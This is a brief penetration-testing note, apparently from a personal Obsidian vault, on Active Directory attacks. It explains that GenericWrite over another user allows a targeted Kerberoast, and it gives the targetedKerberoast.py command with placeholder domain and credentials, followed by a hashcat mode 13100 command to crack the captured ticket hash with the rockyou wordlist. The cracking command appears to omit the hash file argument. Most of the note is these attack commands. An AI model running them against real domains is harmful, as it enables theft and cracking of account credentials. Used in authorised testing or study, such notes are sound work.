When one user has GenericWrite over another, you can do a targeted kerberoast
- python3 [targetedKerberoast.py](http://targetedkerberoast.py/) -v -d <DOMAIN> -u <user> -p <pass>
![[/image 16 14.png|image 16 14.png]]
  
crack that hash with
- hashcat -m 13100 /usr/share/wordlists/rockyou.txt
![[/image 17 12.png|image 17 12.png]]